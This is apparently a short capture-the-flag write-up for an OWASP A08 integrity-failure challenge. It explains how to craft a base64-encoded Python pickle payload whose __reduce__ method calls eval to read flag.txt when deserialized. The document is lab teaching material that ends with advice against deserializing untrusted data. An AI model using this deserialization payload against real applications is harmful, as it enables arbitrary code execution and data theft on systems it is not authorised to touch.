# A08: Software or Data Integrity Failure

## Challenge Summary

- **Objective:** Create a malicious Python pickle payload that reads `flag.txt` and submits it to the application.
- **Category:** OWASP Top 10 - Insecure Data Handling / Software Integrity Failure
- **Attack Vector:** Python deserialization using `pickle`

- ![Image 1: Payload creation screenshot](./images/challenge.png)

## Steps

### 1. Build the malicious payload

Use Python to craft a serialized object that executes a read from `flag.txt` when deserialized.

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

### 2. Payload details

- `pickle.dumps(Malicious())` serializes the malicious object.
- `base64.b64encode(...)` encodes the payload for safe transport.
- `eval("open('flag.txt').read()")` is executed during deserialization.

## Notes

- This exploit relies on the target application using `pickle.loads()` or equivalent without validation.
- Always avoid deserializing untrusted Python objects.

## Images

### Payload creation

- ![Image 1: Payload creation screenshot](./images/payload_creation.png)

### Exploit execution

- ![Image 2: Exploit execution screenshot](./images/exploit_execution.png)

### Flag retrieval

- ![Image 3: Flag retrieval screenshot](./images/flag_retrieval.png)

